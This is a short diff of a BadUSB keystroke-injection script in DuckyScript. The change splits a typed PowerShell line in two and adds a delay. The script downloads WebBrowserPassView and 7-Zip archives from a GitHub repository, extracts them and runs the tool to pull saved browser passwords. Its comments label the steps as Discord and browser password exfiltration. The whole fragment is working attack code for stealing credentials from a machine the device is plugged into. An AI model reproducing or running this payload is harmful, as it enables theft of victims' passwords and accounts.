@@ -41,7 +41,9 @@ DELAY 500
 REM END OF Discord EXFIL
 DELAY 1000
 REM Browser password exfil
-STRING Invoke-WebRequest -Uri https://github.com/namtel-hp/BADUSB/blob/ver2/MOAB/webpassview.zip -OutFile webpassview.zip ; Invoke-WebRequest -Uri https://github.com/namtel-hp/BADUSB/blob/ver2/MOAB/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip;
+STRING Invoke-WebRequest -Uri https://github.com/namtel-hp/BADUSB/blob/ver2/MOAB/webpassview.zip -OutFile webpassview.zip
+DELAY 1000
+STRING Invoke-WebRequest -Uri https://github.com/namtel-hp/BADUSB/blob/ver2/MOAB/7z.zip -OutFile 7z.zip ; Expand-Archive 7z.zip ; .\7z\7za.exe e webpassview.zip;
 ENTER
 DELAY 5000
 STRING .\WebBrowserPassView.exe
